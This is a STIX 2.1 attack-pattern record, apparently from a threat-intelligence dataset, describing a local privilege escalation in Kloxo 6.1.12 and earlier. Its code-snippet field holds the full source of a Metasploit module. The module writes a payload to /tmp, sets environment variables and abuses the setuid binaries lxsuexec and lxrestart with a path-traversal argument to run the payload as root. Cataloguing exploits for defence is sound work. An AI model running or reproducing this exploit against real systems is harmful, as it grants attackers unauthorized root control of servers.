{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3579424e-e705-450b-810f-d7c358b98af5",
    "created": "2024-08-14T16:59:36.665111Z",
    "modified": "2024-08-14T16:59:36.665115Z",
    "name": "Kloxo Local Privilege Escalation",
    "description": " Version 6.1.12 and earlier of Kloxo contain two setuid root binaries such as lxsuexec and lxrestart, allow local privilege escalation to root from uid 48 Apache by default on CentOS 5.8, the operating system supported by Kloxo. This module has been tested successfully with Kloxo 6.1.12 and 6.1.6.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/kloxo_lxsuexec.rb",
            "external_id": "kloxo_lxsuexec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://roothackers.net/showthread.php?tid=92#postreferencingthevulnerabilityandPoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  include Msf::Exploit::Local::Linux\n\n  def initialize(info={})\n    super(update_info(info, {\n      'Name'          => 'Kloxo Local Privilege Escalation',\n      'Description'   => %q{\n          Version 6.1.12 and earlier of Kloxo contain two setuid root binaries such as\n        lxsuexec and lxrestart, allow local privilege escalation to root from uid 48,\n        Apache by default on CentOS 5.8, the operating system supported by Kloxo.\n        This module has been tested successfully with Kloxo 6.1.12 and 6.1.6.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'HTP', # Original PoC according to exploit-db\n          'juan vazquez' # Metasploit module\n        ],\n      'Platform'      => [ 'linux' ],\n      'Arch'          => [ ARCH_X86 ],\n      'SessionTypes'  => [ 'shell' ],\n      'Payload'\t\t=>\n        {\n          'Space'     => 8000,\n          'DisableNops' => true\n        },\n      'References'    =>\n        [\n          [ 'EDB', '25406' ],\n          [ 'OSVDB', '93287' ],\n          [ 'URL', 'http://roothackers.net/showthread.php?tid=92' ] # post referencing the vulnerability and PoC\n        ],\n      'Targets'       =>\n        [\n          [ 'Kloxo 6.1.12', {} ]\n        ],\n      'DefaultOptions' =>\n        {\n          'PrependSetuid'    => true\n        },\n      'DefaultTarget' => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-09-18'\n    }))\n  end\n\n  def exploit\n    # apache uid (48) is needed in order to abuse the setuid lxsuexec binary\n    # .text:0804869D                 call    _getuid\n    # .text:080486A2                 cmp     eax, 48\n    # .text:080486A5                 jz      short loc_80486B6 // uid == 48 (typically apache on CentOS)\n    # .text:080486A7                 mov     [ebp+var_A4], 0Ah\n    # .text:080486B1                 jmp     loc_8048B62 // finish if uid != 48\n    # .text:08048B62 loc_8048B62:                           ; CODE XREF: main+39j\n    #.text:08048B62                                         ; main+B0j\n    #.text:08048B62                 mov     eax, [ebp+var_A4]\n    #.text:08048B68                 add     esp, 0ECh\n    #.text:08048B6E                 pop     ecx\n    #.text:08048B6F                 pop     esi\n    #.text:08048B70                 pop     edi\n    #.text:08048B71                 pop     ebp\n    #.text:08048B72                 lea     esp, [ecx-4]\n    #.text:08048B75                 retn\n    #.text:08048B75 main            endp\n    print_status(\"Checking actual uid...\")\n    id = cmd_exec(\"id -u\")\n    if id != \"48\"\n      fail_with(Failure::NoAccess, \"You are uid #{id}, you must be uid 48(apache) to exploit this\")\n    end\n\n    # Write msf payload to /tmp and give provide executable perms\n    pl = generate_payload_exe\n    payload_path = \"/tmp/#{rand_text_alpha(4)}\"\n    print_status(\"Writing payload executable (#{pl.length} bytes) to #{payload_path} ...\")\n    write_file(payload_path, pl)\n    register_file_for_cleanup(payload_path)\n\n    # Profit\n    print_status(\"Exploiting...\")\n    cmd_exec(\"chmod +x #{payload_path}\")\n    cmd_exec(\"LXLABS=`grep lxlabs /etc/passwd | cut -d: -f3`\")\n    cmd_exec(\"export MUID=$LXLABS\")\n    cmd_exec(\"export GID=$LXLABS\")\n    cmd_exec(\"export TARGET=/bin/sh\")\n    cmd_exec(\"export CHECK_GID=0\")\n    cmd_exec(\"export NON_RESIDENT=1\")\n    helper_path = \"/tmp/#{rand_text_alpha(4)}\"\n    write_file(helper_path, \"/usr/sbin/lxrestart '../../..#{payload_path} #'\")\n    register_file_for_cleanup(helper_path)\n    cmd_exec(\"lxsuexec #{helper_path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-18",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}